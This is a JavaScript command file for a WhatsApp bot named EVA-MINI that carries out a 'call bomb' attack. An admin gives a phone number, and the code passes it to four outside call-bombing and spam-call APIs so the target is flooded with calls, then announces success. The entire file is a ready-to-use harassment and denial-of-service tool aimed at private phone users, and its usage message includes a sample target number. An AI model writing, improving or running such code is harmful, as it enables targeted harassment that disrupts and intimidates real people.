// commands/callbomb.js - Call Bomb Attack for EVA-MINI
const axios = require('axios');
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

function onlyDigits(s = '') { 
    return String(s).replace(/\D/g, ''); 
}

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '📞',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN/OWNER CHECK
        // ============================================
        const sender = msg.key.participant || from;
        const botNumber = jidNormalizedUser(sock.user.id);
        const isOwner = sender.includes(botNumber.split('@')[0]) || msg.key.fromMe;
        
        let isAdmin = isOwner;
        if (!isAdmin && from.endsWith('@g.us')) {
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participant = groupMetadata.participants.find(p => p.id === sender);
                isAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
            } catch (e) {
                isAdmin = false;
            }
        }

        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins/owner can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // CHECK NUMBER
        // ============================================
        const q = args.join(' ');
        if (!q) {
            await sock.sendMessage(from, {
                text: `⚠️ *Usage:* .callbomb [phone_number]\n\n📌 *Example:* .callbomb 94703945265\n\n📞 *Call bomb target!*`
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        const target = onlyDigits(q);
        if (target.length < 10) {
            await sock.sendMessage(from, {
                text: "❌ *Invalid number!*\n\nPlease enter a valid phone number with country code."
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '❌',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const statusMsg = await sock.sendMessage(from, {
            text: `📞 *CALL BOMB ATTACK*\n\n👤 *Target:* +${target}\n📊 *Status:* Initiating Call Bombing...\n\n⏳ Please wait...`
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⏳',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // SEND CALL BOMB
        // ============================================
        let success = false;
        let errorMessage = '';

        // Try different APIs
        const apis = [
            `https://api.siputzx.my.id/api/tools/callbomb?number=${target}`,
            `https://api.alyachan.xyz/api/call?no=${target}`,
            `https://api.itsrose.life/call?number=${target}`,
            `https://api.ngodingaja.my.id/api/spam-call?no=${target}`
        ];

        for (const apiUrl of apis) {
            try {
                await sock.sendMessage(from, {
                    text: `📞 *Trying API...*\n\n⏳ Attempting call bomb...`
                });

                const response = await axios.get(apiUrl, { 
                    timeout: 15000,
                    headers: {
                        'Accept': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });

                if (response.data && response.data.status === 'success') {
                    success = true;
                    break;
                }
            } catch (e) {
                errorMessage = e.message;
                console.log(`API failed: ${apiUrl} - ${e.message}`);
            }
        }

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        if (success) {
            await sock.sendMessage(from, {
                text: `✅ *CALL BOMB COMPLETE!*\n\n👤 *Target:* +${target}\n⚡ *Result:* Attack executed successfully!\n\n📞 *Target will receive multiple calls!*`
            });

            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '✅',
                        key: msg.key
                    }
                });
            } catch (e) {}

        } else {
            // If API fails, send a warning
            await sock.sendMessage(from, {
                text: `⚠️ *Call Bomb API Error*\n\n👤 *Target:* +${target}\n❌ *Error:* ${errorMessage || 'All APIs failed'}\n\n📞 *Try using .callbomb with a valid number*`
            });

            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⚠️',
                        key: msg.key
                    }
                });
            } catch (e) {}
        }

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

    } catch (error) {
        console.error('Call bomb error:', error);
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}`
        });
    }
};